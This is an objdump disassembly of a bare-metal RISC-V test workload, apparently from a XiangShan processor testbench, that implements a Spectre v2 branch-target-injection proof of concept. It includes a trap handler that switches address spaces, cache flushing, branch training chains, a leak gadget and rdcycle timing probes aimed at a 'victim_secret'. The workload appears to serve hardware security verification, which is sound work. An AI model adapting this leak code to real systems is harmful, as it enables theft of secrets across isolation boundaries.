
/nfs/home/leizhenyu/opt/testbench/targets/xiangshan/workloads/spectre-v2-hs-sv39-kmhv2/build/spectre-v2-hs-sv39-kmhv2-riscv64-xs-flash.elf:     file format elf64-littleriscv


Disassembly of section .text:

0000000010000000 <_start>:
    10000000:	00000413          	li	s0,0
    10000004:	6509                	lui	a0,0x2
    10000006:	30052073          	csrs	mstatus,a0
    1000000a:	00305073          	csrwi	fcsr,0
    1000000e:	70000297          	auipc	t0,0x70000
    10000012:	ff228293          	addi	t0,t0,-14 # 80000000 <direct_victim_fault_seen>
    10000016:	70008317          	auipc	t1,0x70008
    1000001a:	fea30313          	addi	t1,t1,-22 # 80008000 <leaked_top_score>
    1000001e:	40530e33          	sub	t3,t1,t0
    10000022:	f1402ef3          	csrr	t4,mhartid
    10000026:	03de0f33          	mul	t5,t3,t4
    1000002a:	006f0133          	add	sp,t5,t1
    1000002e:	06d020ef          	jal	1000289a <_trm_init>

0000000010000032 <_mainargs>:
	...

0000000010000034 <m_trap_entry>:
    10000034:	34011173          	csrrw	sp,mscratch,sp
    10000038:	7135                	addi	sp,sp,-160
    1000003a:	e006                	sd	ra,0(sp)
    1000003c:	e416                	sd	t0,8(sp)
    1000003e:	e81a                	sd	t1,16(sp)
    10000040:	ec1e                	sd	t2,24(sp)
    10000042:	700c9297          	auipc	t0,0x700c9
    10000046:	fd628293          	addi	t0,t0,-42 # 800c9018 <current_trap_frame_sp>
    1000004a:	0022b023          	sd	sp,0(t0)
    1000004e:	f02a                	sd	a0,32(sp)
    10000050:	f42e                	sd	a1,40(sp)
    10000052:	f832                	sd	a2,48(sp)
    10000054:	fc36                	sd	a3,56(sp)
    10000056:	e0ba                	sd	a4,64(sp)
    10000058:	e4be                	sd	a5,72(sp)
    1000005a:	e8c2                	sd	a6,80(sp)
    1000005c:	ecc6                	sd	a7,88(sp)
    1000005e:	34202573          	csrr	a0,mcause
    10000062:	341025f3          	csrr	a1,mepc
    10000066:	7602                	ld	a2,32(sp)
    10000068:	76a2                	ld	a3,40(sp)
    1000006a:	6766                	ld	a4,88(sp)
    1000006c:	250000ef          	jal	100002bc <m_trap_dispatch>
    10000070:	700c9297          	auipc	t0,0x700c9
    10000074:	fd828293          	addi	t0,t0,-40 # 800c9048 <victim_trap_return_to_machine>
    10000078:	0002a303          	lw	t1,0(t0)
    1000007c:	04031063          	bnez	t1,100000bc <m_trap_entry+0x88>
    10000080:	700c9297          	auipc	t0,0x700c9
    10000084:	fd028293          	addi	t0,t0,-48 # 800c9050 <attack_done>
    10000088:	0002a303          	lw	t1,0(t0)
    1000008c:	0a031e63          	bnez	t1,10000148 <m_trap_entry+0x114>
    10000090:	341022f3          	csrr	t0,mepc
    10000094:	0291                	addi	t0,t0,4
    10000096:	34129073          	csrw	mepc,t0
    1000009a:	6082                	ld	ra,0(sp)
    1000009c:	62a2                	ld	t0,8(sp)
    1000009e:	6342                	ld	t1,16(sp)
    100000a0:	63e2                	ld	t2,24(sp)
    100000a2:	7502                	ld	a0,32(sp)
    100000a4:	75a2                	ld	a1,40(sp)
    100000a6:	7642                	ld	a2,48(sp)
    100000a8:	76e2                	ld	a3,56(sp)
    100000aa:	6706                	ld	a4,64(sp)
    100000ac:	67a6                	ld	a5,72(sp)
    100000ae:	6846                	ld	a6,80(sp)
    100000b0:	68e6                	ld	a7,88(sp)
    100000b2:	610d                	addi	sp,sp,160
    100000b4:	34011173          	csrrw	sp,mscratch,sp
    100000b8:	30200073          	mret
    100000bc:	0002a023          	sw	zero,0(t0)
    100000c0:	700c9297          	auipc	t0,0x700c9
    100000c4:	f4828293          	addi	t0,t0,-184 # 800c9008 <saved_attacker_mscratch>
    100000c8:	0002b303          	ld	t1,0(t0)
    100000cc:	34031073          	csrw	mscratch,t1
    100000d0:	700c9297          	auipc	t0,0x700c9
    100000d4:	f5028293          	addi	t0,t0,-176 # 800c9020 <attacker_satp_for_trap>
    100000d8:	0002b303          	ld	t1,0(t0)
    100000dc:	18031073          	csrw	satp,t1
    100000e0:	0000100f          	fence.i
    100000e4:	18002373          	csrr	t1,satp
    100000e8:	700c9297          	auipc	t0,0x700c9
    100000ec:	f4828293          	addi	t0,t0,-184 # 800c9030 <observed_attacker_satp>
    100000f0:	0062b023          	sd	t1,0(t0)
    100000f4:	700c9297          	auipc	t0,0x700c9
    100000f8:	f0c28293          	addi	t0,t0,-244 # 800c9000 <resume_attacker_epc>
    100000fc:	0002b303          	ld	t1,0(t0)
    10000100:	34131073          	csrw	mepc,t1
    10000104:	000222b7          	lui	t0,0x22
    10000108:	8002829b          	addiw	t0,t0,-2048 # 21800 <_start-0xffde800>
    1000010c:	3002b073          	csrc	mstatus,t0
    10000110:	6285                	lui	t0,0x1
    10000112:	8002829b          	addiw	t0,t0,-2048 # 800 <_start-0xffff800>
    10000116:	3002a073          	csrs	mstatus,t0
    1000011a:	700c9297          	auipc	t0,0x700c9
    1000011e:	ef628293          	addi	t0,t0,-266 # 800c9010 <saved_attacker_trap_sp>
    10000122:	0002b103          	ld	sp,0(t0)
    10000126:	6082                	ld	ra,0(sp)
    10000128:	62a2                	ld	t0,8(sp)
    1000012a:	6342                	ld	t1,16(sp)
    1000012c:	63e2                	ld	t2,24(sp)
    1000012e:	7502                	ld	a0,32(sp)
    10000130:	75a2                	ld	a1,40(sp)
    10000132:	7642                	ld	a2,48(sp)
    10000134:	76e2                	ld	a3,56(sp)
    10000136:	6706                	ld	a4,64(sp)
    10000138:	67a6                	ld	a5,72(sp)
    1000013a:	6846                	ld	a6,80(sp)
    1000013c:	68e6                	ld	a7,88(sp)
    1000013e:	610d                	addi	sp,sp,160
    10000140:	34011173          	csrrw	sp,mscratch,sp
    10000144:	30200073          	mret
    10000148:	00002297          	auipc	t0,0x2
    1000014c:	26028293          	addi	t0,t0,608 # 100023a8 <machine_low_return>
    10000150:	34129073          	csrw	mepc,t0
    10000154:	000222b7          	lui	t0,0x22
    10000158:	8002829b          	addiw	t0,t0,-2048 # 21800 <_start-0xffde800>
    1000015c:	3002b073          	csrc	mstatus,t0
    10000160:	6289                	lui	t0,0x2
    10000162:	8002829b          	addiw	t0,t0,-2048 # 1800 <_start-0xfffe800>
    10000166:	3002a073          	csrs	mstatus,t0
    1000016a:	6082                	ld	ra,0(sp)
    1000016c:	62a2                	ld	t0,8(sp)
    1000016e:	6342                	ld	t1,16(sp)
    10000170:	63e2                	ld	t2,24(sp)
    10000172:	7502                	ld	a0,32(sp)
    10000174:	75a2                	ld	a1,40(sp)
    10000176:	7642                	ld	a2,48(sp)
    10000178:	76e2                	ld	a3,56(sp)
    1000017a:	6706                	ld	a4,64(sp)
    1000017c:	67a6                	ld	a5,72(sp)
    1000017e:	6846                	ld	a6,80(sp)
    10000180:	68e6                	ld	a7,88(sp)
    10000182:	610d                	addi	sp,sp,160
    10000184:	00002297          	auipc	t0,0x2
    10000188:	22428293          	addi	t0,t0,548 # 100023a8 <machine_low_return>
    1000018c:	8282                	jr	t0

000000001000018e <putstr>:
    1000018e:	1141                	addi	sp,sp,-16
    10000190:	e022                	sd	s0,0(sp)
    10000192:	e406                	sd	ra,8(sp)
    10000194:	842a                	mv	s0,a0
    10000196:	00054503          	lbu	a0,0(a0) # 2000 <_start-0xfffe000>
    1000019a:	c519                	beqz	a0,100001a8 <putstr+0x1a>
    1000019c:	0405                	addi	s0,s0,1
    1000019e:	60e020ef          	jal	100027ac <_putc>
    100001a2:	00044503          	lbu	a0,0(s0)
    100001a6:	f97d                	bnez	a0,1000019c <putstr+0xe>
    100001a8:	60a2                	ld	ra,8(sp)
    100001aa:	6402                	ld	s0,0(sp)
    100001ac:	0141                	addi	sp,sp,16
    100001ae:	8082                	ret

00000000100001b0 <map_identity_range>:
    100001b0:	6785                	lui	a5,0x1
    100001b2:	17fd                	addi	a5,a5,-1 # fff <_start-0xffff001>
    100001b4:	777d                	lui	a4,0xfffff
    100001b6:	963e                	add	a2,a2,a5
    100001b8:	00569e93          	slli	t4,a3,0x5
    100001bc:	8df9                	and	a1,a1,a4
    100001be:	00e67e33          	and	t3,a2,a4
    100001c2:	080efe93          	andi	t4,t4,128
    100001c6:	0fc5f763          	bgeu	a1,t3,100002b4 <map_identity_range+0x104>
    100001ca:	000518b7          	lui	a7,0x51
    100001ce:	98aa                	add	a7,a7,a0
    100001d0:	4f3d                	li	t5,15
    100001d2:	6305                	lui	t1,0x1
    100001d4:	03f00f93          	li	t6,63
    100001d8:	01e5d393          	srli	t2,a1,0x1e
    100001dc:	1ff3f793          	andi	a5,t2,511
    100001e0:	20a7e3b3          	sh3add	t2,a5,a0
    100001e4:	0003b783          	ld	a5,0(t2)
    100001e8:	0155d293          	srli	t0,a1,0x15
    100001ec:	00c5d613          	srli	a2,a1,0xc
    100001f0:	0017f713          	andi	a4,a5,1
    100001f4:	1ff2f293          	andi	t0,t0,511
    100001f8:	1ff67813          	andi	a6,a2,511
    100001fc:	e329                	bnez	a4,1000023e <map_identity_range+0x8e>
    100001fe:	0008b783          	ld	a5,0(a7) # 51000 <_start-0xffaf000>
    10000202:	0aff6b63          	bltu	t5,a5,100002b8 <map_identity_range+0x108>
    10000206:	0785                	addi	a5,a5,1
    10000208:	07b2                	slli	a5,a5,0xc
    1000020a:	97aa                	add	a5,a5,a0
    1000020c:	00678733          	add	a4,a5,t1
    10000210:	0007b023          	sd	zero,0(a5)
    10000214:	07a1                	addi	a5,a5,8
    10000216:	fef71de3          	bne	a4,a5,10000210 <map_identity_range+0x60>
    1000021a:	0008b783          	ld	a5,0(a7)
    1000021e:	00178713          	addi	a4,a5,1
    10000222:	00e8b023          	sd	a4,0(a7)
    10000226:	2781                	sext.w	a5,a5
    10000228:	0807c863          	bltz	a5,100002b8 <map_identity_range+0x108>
    1000022c:	0785                	addi	a5,a5,1
    1000022e:	07b2                	slli	a5,a5,0xc
    10000230:	97aa                	add	a5,a5,a0
    10000232:	83b1                	srli	a5,a5,0xc
    10000234:	07aa                	slli	a5,a5,0xa
    10000236:	0017e793          	ori	a5,a5,1
    1000023a:	00f3b023          	sd	a5,0(t2)
    1000023e:	83a9                	srli	a5,a5,0xa
    10000240:	07b2                	slli	a5,a5,0xc
    10000242:	20f2e2b3          	sh3add	t0,t0,a5
    10000246:	0002b783          	ld	a5,0(t0)
    1000024a:	0017f713          	andi	a4,a5,1
    1000024e:	e329                	bnez	a4,10000290 <map_identity_range+0xe0>
    10000250:	0088b783          	ld	a5,8(a7)
    10000254:	06ffe263          	bltu	t6,a5,100002b8 <map_identity_range+0x108>
    10000258:	07c5                	addi	a5,a5,17
    1000025a:	07b2                	slli	a5,a5,0xc
    1000025c:	97aa                	add	a5,a5,a0
    1000025e:	00678733          	add	a4,a5,t1
    10000262:	0007b023          	sd	zero,0(a5)
    10000266:	07a1                	addi	a5,a5,8
    10000268:	fef71de3          	bne	a4,a5,10000262 <map_identity_range+0xb2>
    1000026c:	0088b783          	ld	a5,8(a7)
    10000270:	00178713          	addi	a4,a5,1
    10000274:	00e8b423          	sd	a4,8(a7)
    10000278:	2781                	sext.w	a5,a5
    1000027a:	0207cf63          	bltz	a5,100002b8 <map_identity_range+0x108>
    1000027e:	07c5                	addi	a5,a5,17
    10000280:	07b2                	slli	a5,a5,0xc
    10000282:	97aa                	add	a5,a5,a0
    10000284:	83b1                	srli	a5,a5,0xc
    10000286:	07aa                	slli	a5,a5,0xa
    10000288:	0017e793          	ori	a5,a5,1
    1000028c:	00f2b023          	sd	a5,0(t0)
    10000290:	83a9                	srli	a5,a5,0xa
    10000292:	07b2                	slli	a5,a5,0xc
    10000294:	20f86833          	sh3add	a6,a6,a5
    10000298:	02080063          	beqz	a6,100002b8 <map_identity_range+0x108>
    1000029c:	00a61793          	slli	a5,a2,0xa
    100002a0:	8fd5                	or	a5,a5,a3
    100002a2:	01d7e7b3          	or	a5,a5,t4
    100002a6:	0417e793          	ori	a5,a5,65
    100002aa:	00f83023          	sd	a5,0(a6)
    100002ae:	959a                	add	a1,a1,t1
    100002b0:	f3c5e4e3          	bltu	a1,t3,100001d8 <map_identity_range+0x28>
    100002b4:	4501                	li	a0,0
    100002b6:	8082                	ret
    100002b8:	557d                	li	a0,-1
    100002ba:	8082                	ret

00000000100002bc <m_trap_dispatch>:
    100002bc:	700c9817          	auipc	a6,0x700c9
    100002c0:	dd480813          	addi	a6,a6,-556 # 800c9090 <trap_count>
    100002c4:	00083783          	ld	a5,0(a6)
    100002c8:	0785                	addi	a5,a5,1
    100002ca:	00f83023          	sd	a5,0(a6)
    100002ce:	700c9797          	auipc	a5,0x700c9
    100002d2:	d8a7b923          	sd	a0,-622(a5) # 800c9060 <last_mcause>
    100002d6:	700c9797          	auipc	a5,0x700c9
    100002da:	d8b7b123          	sd	a1,-638(a5) # 800c9058 <last_mepc>
    100002de:	ff757813          	andi	a6,a0,-9
    100002e2:	4795                	li	a5,5
    100002e4:	04f80163          	beq	a6,a5,10000326 <m_trap_dispatch+0x6a>
    100002e8:	47a5                	li	a5,9
    100002ea:	04f51363          	bne	a0,a5,10000330 <m_trap_dispatch+0x74>
    100002ee:	4785                	li	a5,1
    100002f0:	0af70a63          	beq	a4,a5,100003a4 <m_trap_dispatch+0xe8>
    100002f4:	4691                	li	a3,4
    100002f6:	08d70b63          	beq	a4,a3,1000038c <m_trap_dispatch+0xd0>
    100002fa:	4689                	li	a3,2
    100002fc:	06d70663          	beq	a4,a3,10000368 <m_trap_dispatch+0xac>
    10000300:	468d                	li	a3,3
    10000302:	18d70163          	beq	a4,a3,10000484 <victim_machine_return+0x2e>
    10000306:	700c9617          	auipc	a2,0x700c9
    1000030a:	d6260613          	addi	a2,a2,-670 # 800c9068 <bad_trap_count>
    1000030e:	6218                	ld	a4,0(a2)
    10000310:	0705                	addi	a4,a4,1 # fffffffffffff001 <_bss_end+0xffffffff7ff35f69>
    10000312:	e218                	sd	a4,0(a2)
    10000314:	700c9717          	auipc	a4,0x700c9
    10000318:	d2d72c23          	sw	a3,-712(a4) # 800c904c <attack_status>
    1000031c:	700c9717          	auipc	a4,0x700c9
    10000320:	d2f72a23          	sw	a5,-716(a4) # 800c9050 <attack_done>
    10000324:	8082                	ret
    10000326:	70003797          	auipc	a5,0x70003
    1000032a:	cda7b783          	ld	a5,-806(a5) # 80003000 <direct_victim_fault_expected>
    1000032e:	e39d                	bnez	a5,10000354 <m_trap_dispatch+0x98>
    10000330:	700c9717          	auipc	a4,0x700c9
    10000334:	d3870713          	addi	a4,a4,-712 # 800c9068 <bad_trap_count>
    10000338:	631c                	ld	a5,0(a4)
    1000033a:	0785                	addi	a5,a5,1
    1000033c:	e31c                	sd	a5,0(a4)
    1000033e:	4789                	li	a5,2
    10000340:	700c9717          	auipc	a4,0x700c9
    10000344:	d0f72623          	sw	a5,-756(a4) # 800c904c <attack_status>
    10000348:	4785                	li	a5,1
    1000034a:	700c9717          	auipc	a4,0x700c9
    1000034e:	d0f72323          	sw	a5,-762(a4) # 800c9050 <attack_done>
    10000352:	8082                	ret
    10000354:	4785                	li	a5,1
    10000356:	70000717          	auipc	a4,0x70000
    1000035a:	caf73523          	sd	a5,-854(a4) # 80000000 <direct_victim_fault_seen>
    1000035e:	70003797          	auipc	a5,0x70003
    10000362:	ca07b123          	sd	zero,-862(a5) # 80003000 <direct_victim_fault_expected>
    10000366:	8082                	ret
    10000368:	700c9697          	auipc	a3,0x700c9
    1000036c:	d1068693          	addi	a3,a3,-752 # 800c9078 <flush_call_count>
    10000370:	6298                	ld	a4,0(a3)
    10000372:	6791                	lui	a5,0x4
    10000374:	97b2                	add	a5,a5,a2
    10000376:	0705                	addi	a4,a4,1
    10000378:	e298                	sd	a4,0(a3)
    1000037a:	0026200f          	cbo.flush	(a2)
    1000037e:	04060613          	addi	a2,a2,64
    10000382:	fef61ce3          	bne	a2,a5,1000037a <m_trap_dispatch+0xbe>
    10000386:	0330000f          	fence	rw,rw
    1000038a:	8082                	ret
    1000038c:	700c9697          	auipc	a3,0x700c9
    10000390:	cf468693          	addi	a3,a3,-780 # 800c9080 <victim_done_count>
    10000394:	6298                	ld	a4,0(a3)
    10000396:	0705                	addi	a4,a4,1
    10000398:	e298                	sd	a4,0(a3)
    1000039a:	700c9717          	auipc	a4,0x700c9
    1000039e:	caf72723          	sw	a5,-850(a4) # 800c9048 <victim_trap_return_to_machine>
    100003a2:	8082                	ret
    100003a4:	700c9717          	auipc	a4,0x700c9
    100003a8:	ce470713          	addi	a4,a4,-796 # 800c9088 <victim_call_count>
    100003ac:	631c                	ld	a5,0(a4)
    100003ae:	0591                	addi	a1,a1,4
    100003b0:	0785                	addi	a5,a5,1 # 4001 <_start-0xfffbfff>
    100003b2:	e31c                	sd	a5,0(a4)
    100003b4:	700c9797          	auipc	a5,0x700c9
    100003b8:	c4b7b623          	sd	a1,-948(a5) # 800c9000 <resume_attacker_epc>
    100003bc:	700c9797          	auipc	a5,0x700c9
    100003c0:	c5c7b783          	ld	a5,-932(a5) # 800c9018 <current_trap_frame_sp>
    100003c4:	700c9717          	auipc	a4,0x700c9
    100003c8:	c4f73623          	sd	a5,-948(a4) # 800c9010 <saved_attacker_trap_sp>
    100003cc:	340027f3          	csrr	a5,mscratch
    100003d0:	700c9717          	auipc	a4,0x700c9
    100003d4:	c2f73c23          	sd	a5,-968(a4) # 800c9008 <saved_attacker_mscratch>
    100003d8:	70014797          	auipc	a5,0x70014
    100003dc:	c2c7b423          	sd	a2,-984(a5) # 80014000 <victim_arg_idx>
    100003e0:	70015797          	auipc	a5,0x70015
    100003e4:	c2d7b023          	sd	a3,-992(a5) # 80015000 <victim_arg_probe>
    100003e8:	700c9797          	auipc	a5,0x700c9
    100003ec:	c607a023          	sw	zero,-928(a5) # 800c9048 <victim_trap_return_to_machine>
    100003f0:	34002773          	csrr	a4,mscratch
    100003f4:	70072797          	auipc	a5,0x70072
    100003f8:	c247b783          	ld	a5,-988(a5) # 80072018 <victim_space+0x51018>
    100003fc:	18079073          	csrw	satp,a5
    10000400:	0000100f          	fence.i
    10000404:	180027f3          	csrr	a5,satp
    10000408:	700c9697          	auipc	a3,0x700c9
    1000040c:	c2f6b023          	sd	a5,-992(a3) # 800c9028 <observed_victim_satp>
    10000410:	300027f3          	csrr	a5,mstatus
    10000414:	700c7697          	auipc	a3,0x700c7
    10000418:	bdc68693          	addi	a3,a3,-1060 # 800c6ff0 <m_stack+0x1ff0>
    1000041c:	70021617          	auipc	a2,0x70021
    10000420:	bd460613          	addi	a2,a2,-1068 # 80020ff0 <victim_stack+0x3ff0>
    10000424:	00001597          	auipc	a1,0x1
    10000428:	e6c58593          	addi	a1,a1,-404 # 10001290 <victim_process_entry>
    1000042c:	48b79793          	bclri	a5,a5,0xb
    10000430:	48c79793          	bclri	a5,a5,0xc
    10000434:	28b79793          	bseti	a5,a5,0xb
    10000438:	700c9297          	auipc	t0,0x700c9
    1000043c:	c0028293          	addi	t0,t0,-1024 # 800c9038 <saved_victim_m_sp>
    10000440:	0022b023          	sd	sp,0(t0)
    10000444:	34069073          	csrw	mscratch,a3
    10000448:	8132                	mv	sp,a2
    1000044a:	30079073          	csrw	mstatus,a5
    1000044e:	34159073          	csrw	mepc,a1
    10000452:	30200073          	mret

0000000010000456 <victim_machine_return>:
    10000456:	700c9297          	auipc	t0,0x700c9
    1000045a:	be228293          	addi	t0,t0,-1054 # 800c9038 <saved_victim_m_sp>
    1000045e:	0002b103          	ld	sp,0(t0)
    10000462:	34071073          	csrw	mscratch,a4
    10000466:	700c4797          	auipc	a5,0x700c4
    1000046a:	bb27b783          	ld	a5,-1102(a5) # 800c4018 <attacker_space+0x51018>
    1000046e:	18079073          	csrw	satp,a5
    10000472:	0000100f          	fence.i
    10000476:	180027f3          	csrr	a5,satp
    1000047a:	700c9717          	auipc	a4,0x700c9
    1000047e:	baf73b23          	sd	a5,-1098(a4) # 800c9030 <observed_attacker_satp>
    10000482:	8082                	ret
    10000484:	700c9697          	auipc	a3,0x700c9
    10000488:	bec68693          	addi	a3,a3,-1044 # 800c9070 <exit_call_count>
    1000048c:	6298                	ld	a4,0(a3)
    1000048e:	0705                	addi	a4,a4,1
    10000490:	e298                	sd	a4,0(a3)
    10000492:	700c9717          	auipc	a4,0x700c9
    10000496:	bac72d23          	sw	a2,-1094(a4) # 800c904c <attack_status>
    1000049a:	700c9717          	auipc	a4,0x700c9
    1000049e:	baf72b23          	sw	a5,-1098(a4) # 800c9050 <attack_done>
    100004a2:	8082                	ret
	...

Disassembly of section .u_text:

0000000010001000 <__u_text_start>:
    10001000:	fb010113          	addi	sp,sp,-80
    10001004:	00113023          	sd	ra,0(sp)
    10001008:	00913423          	sd	s1,8(sp)
    1000100c:	01213823          	sd	s2,16(sp)
    10001010:	01313c23          	sd	s3,24(sp)
    10001014:	03413023          	sd	s4,32(sp)
    10001018:	03513423          	sd	s5,40(sp)
    1000101c:	03613823          	sd	s6,48(sp)
    10001020:	00050a13          	mv	s4,a0
    10001024:	00058493          	mv	s1,a1
    10001028:	70015997          	auipc	s3,0x70015
    1000102c:	fd898993          	addi	s3,s3,-40 # 80016000 <v2_public_dummy>
    10001030:	02000913          	li	s2,32
    10001034:	70018a97          	auipc	s5,0x70018
    10001038:	fcca8a93          	addi	s5,s5,-52 # 80019000 <v2_train_root>
    1000103c:	7001bb17          	auipc	s6,0x7001b
    10001040:	fc4b0b13          	addi	s6,s6,-60 # 8001c000 <v2_attack_root>
    10001044:	000a0463          	beqz	s4,1000104c <__u_text_start+0x4c>
    10001048:	0080006f          	j	10001050 <__u_text_start+0x50>
    1000104c:	00098a13          	mv	s4,s3
    10001050:	000a4283          	lbu	t0,0(s4)
    10001054:	00048313          	mv	t1,s1
    10001058:	00000293          	li	t0,0
    1000105c:	10000393          	li	t2,256
    10001060:	0023200f          	cbo.flush	(t1)
    10001064:	04030313          	addi	t1,t1,64 # 1040 <_start-0xfffefc0>
    10001068:	00128293          	addi	t0,t0,1
    1000106c:	fe72eae3          	bltu	t0,t2,10001060 <__u_text_start+0x60>
    10001070:	0330000f          	fence	rw,rw
    10001074:	00193e93          	seqz	t4,s2
    10001078:	41d00eb3          	neg	t4,t4
    1000107c:	0149cf33          	xor	t5,s3,s4
    10001080:	01df7f33          	and	t5,t5,t4
    10001084:	01e9c533          	xor	a0,s3,t5
    10001088:	016acf33          	xor	t5,s5,s6
    1000108c:	01df7f33          	and	t5,t5,t4
    10001090:	01eace33          	xor	t3,s5,t5
    10001094:	70018297          	auipc	t0,0x70018
    10001098:	f6c28293          	addi	t0,t0,-148 # 80019000 <v2_train_root>
    1000109c:	0022a00f          	cbo.flush	(t0)
    100010a0:	70017297          	auipc	t0,0x70017
    100010a4:	f6028293          	addi	t0,t0,-160 # 80018000 <v2_train_mid>
    100010a8:	0022a00f          	cbo.flush	(t0)
    100010ac:	70016297          	auipc	t0,0x70016
    100010b0:	f5428293          	addi	t0,t0,-172 # 80017000 <v2_train_node>
    100010b4:	0022a00f          	cbo.flush	(t0)
    100010b8:	7001b297          	auipc	t0,0x7001b
    100010bc:	f4828293          	addi	t0,t0,-184 # 8001c000 <v2_attack_root>
    100010c0:	0022a00f          	cbo.flush	(t0)
    100010c4:	7001a297          	auipc	t0,0x7001a
    100010c8:	f3c28293          	addi	t0,t0,-196 # 8001b000 <v2_attack_mid>
    100010cc:	0022a00f          	cbo.flush	(t0)
    100010d0:	70019297          	auipc	t0,0x70019
    100010d4:	f3028293          	addi	t0,t0,-208 # 8001a000 <v2_attack_node>
    100010d8:	0022a00f          	cbo.flush	(t0)
    100010dc:	0330000f          	fence	rw,rw
    100010e0:	000e3383          	ld	t2,0(t3)
    100010e4:	0003b383          	ld	t2,0(t2)
    100010e8:	0003b383          	ld	t2,0(t2)
    100010ec:	00000013          	nop
    100010f0:	00000013          	nop
    100010f4:	00000013          	nop
    100010f8:	00000013          	nop
    100010fc:	00000013          	nop
    10001100:	00038067          	jr	t2
    10001104:	00000013          	nop
    10001108:	00000013          	nop
    1000110c:	00000013          	nop
    10001110:	00000013          	nop
    10001114:	00000013          	nop
    10001118:	00000013          	nop
    1000111c:	00000013          	nop
    10001120:	00000013          	nop
    10001124:	00000013          	nop
    10001128:	00000013          	nop
    1000112c:	00000013          	nop
    10001130:	00000013          	nop
    10001134:	00000013          	nop
    10001138:	00000013          	nop
    1000113c:	00000013          	nop

0000000010001140 <v2_asm_gadget>:
    10001140:	00054303          	lbu	t1,0(a0)
    10001144:	00631313          	slli	t1,t1,0x6
    10001148:	00648333          	add	t1,s1,t1
    1000114c:	00034003          	lbu	zero,0(t1)
    10001150:	0380006f          	j	10001188 <v2_asm_safe+0x8>
    10001154:	00000013          	nop
    10001158:	00000013          	nop
    1000115c:	00000013          	nop
    10001160:	00000013          	nop
    10001164:	00000013          	nop
    10001168:	00000013          	nop
    1000116c:	00000013          	nop
    10001170:	00000013          	nop
    10001174:	00000013          	nop
    10001178:	00000013          	nop
    1000117c:	00000013          	nop

0000000010001180 <v2_asm_safe>:
    10001180:	00157313          	andi	t1,a0,1
    10001184:	0040006f          	j	10001188 <v2_asm_safe+0x8>
    10001188:	00090663          	beqz	s2,10001194 <v2_asm_safe+0x14>
    1000118c:	fff90913          	addi	s2,s2,-1
    10001190:	ee5ff06f          	j	10001074 <__u_text_start+0x74>
    10001194:	00013083          	ld	ra,0(sp)
    10001198:	00813483          	ld	s1,8(sp)
    1000119c:	01013903          	ld	s2,16(sp)
    100011a0:	01813983          	ld	s3,24(sp)
    100011a4:	02013a03          	ld	s4,32(sp)
    100011a8:	02813a83          	ld	s5,40(sp)
    100011ac:	03013b03          	ld	s6,48(sp)
    100011b0:	05010113          	addi	sp,sp,80
    100011b4:	00008067          	ret
    100011b8:	00000013          	nop
    100011bc:	00000013          	nop

00000000100011c0 <is_candidate_value>:
    100011c0:	fd050713          	addi	a4,a0,-48
    100011c4:	47a5                	li	a5,9
    100011c6:	00e7f963          	bgeu	a5,a4,100011d8 <is_candidate_value+0x18>
    100011ca:	fdf57513          	andi	a0,a0,-33
    100011ce:	fbf50513          	addi	a0,a0,-65
    100011d2:	01a53513          	sltiu	a0,a0,26
    100011d6:	8082                	ret
    100011d8:	4505                	li	a0,1
    100011da:	8082                	ret
    100011dc:	00000013          	nop

00000000100011e0 <reload_mix>:
    100011e0:	20b5e7b3          	sh3add	a5,a1,a1
    100011e4:	20b7e7b3          	sh3add	a5,a5,a1
    100011e8:	953e                	add	a0,a0,a5
    100011ea:	00351793          	slli	a5,a0,0x3
    100011ee:	7f87f793          	andi	a5,a5,2040
    100011f2:	8fa9                	xor	a5,a5,a0
    100011f4:	0ff7f793          	zext.b	a5,a5
    100011f8:	0057d513          	srli	a0,a5,0x5
    100011fc:	8fa9                	xor	a5,a5,a0
    100011fe:	00179513          	slli	a0,a5,0x1
    10001202:	0ff57513          	zext.b	a0,a0
    10001206:	8d3d                	xor	a0,a0,a5
    10001208:	8082                	ret
    1000120a:	00000013          	nop
    1000120e:	0001                	nop

0000000010001210 <u_probe_time>:
    10001210:	0330000f          	fence	rw,rw
    10001214:	c00027f3          	rdcycle	a5
    10001218:	00054683          	lbu	a3,0(a0)
    1000121c:	0330000f          	fence	rw,rw
    10001220:	c0002773          	rdcycle	a4
    10001224:	40f70533          	sub	a0,a4,a5
    10001228:	8082                	ret
    1000122a:	00000013          	nop
    1000122e:	0001                	nop

0000000010001230 <probe_direct_victim_access>:
    10001230:	6ffff797          	auipc	a5,0x6ffff
    10001234:	dc07b823          	sd	zero,-560(a5) # 80000000 <direct_victim_fault_seen>
    10001238:	70000797          	auipc	a5,0x70000
    1000123c:	dc07b423          	sd	zero,-568(a5) # 80001000 <direct_victim_read_completed>
    10001240:	70001797          	auipc	a5,0x70001
    10001244:	dc07b023          	sd	zero,-576(a5) # 80002000 <direct_victim_read_value>
    10001248:	4785                	li	a5,1
    1000124a:	70002717          	auipc	a4,0x70002
    1000124e:	daf73b23          	sd	a5,-586(a4) # 80003000 <direct_victim_fault_expected>
    10001252:	70012717          	auipc	a4,0x70012
    10001256:	dae70713          	addi	a4,a4,-594 # 80013000 <victim_secret>
    1000125a:	00074683          	lbu	a3,0(a4)
    1000125e:	70002717          	auipc	a4,0x70002
    10001262:	da073123          	sd	zero,-606(a4) # 80003000 <direct_victim_fault_expected>
    10001266:	6ffff717          	auipc	a4,0x6ffff
    1000126a:	d9a73703          	ld	a4,-614(a4) # 80000000 <direct_victim_fault_seen>
    1000126e:	eb09                	bnez	a4,10001280 <probe_direct_victim_access+0x50>
    10001270:	70001717          	auipc	a4,0x70001
    10001274:	d8d73823          	sd	a3,-624(a4) # 80002000 <direct_victim_read_value>
    10001278:	70000717          	auipc	a4,0x70000
    1000127c:	d8f73423          	sd	a5,-632(a4) # 80001000 <direct_victim_read_completed>
    10001280:	8082                	ret
    10001282:	0001                	nop
    10001284:	00000013          	nop
    10001288:	00000013          	nop
    1000128c:	00000013          	nop

0000000010001290 <victim_process_entry>:
    10001290:	1141                	addi	sp,sp,-16
    10001292:	70013517          	auipc	a0,0x70013
    10001296:	d6e53503          	ld	a0,-658(a0) # 80014000 <victim_arg_idx>
    1000129a:	70014597          	auipc	a1,0x70014
    1000129e:	d665b583          	ld	a1,-666(a1) # 80015000 <victim_arg_probe>
    100012a2:	e406                	sd	ra,8(sp)
    100012a4:	d5dff0ef          	jal	10001000 <__u_text_start>
    100012a8:	4891                	li	a7,4
    100012aa:	00000073          	ecall
    100012ae:	10500073          	wfi
    100012b2:	10500073          	wfi
    100012b6:	bfe5                	j	100012ae <victim_process_entry+0x1e>
    100012b8:	00000013          	nop
    100012bc:	00000013          	nop

00000000100012c0 <svc_exit>:
    100012c0:	488d                	li	a7,3
    100012c2:	00000073          	ecall
    100012c6:	00000013          	nop
    100012ca:	00000013          	nop
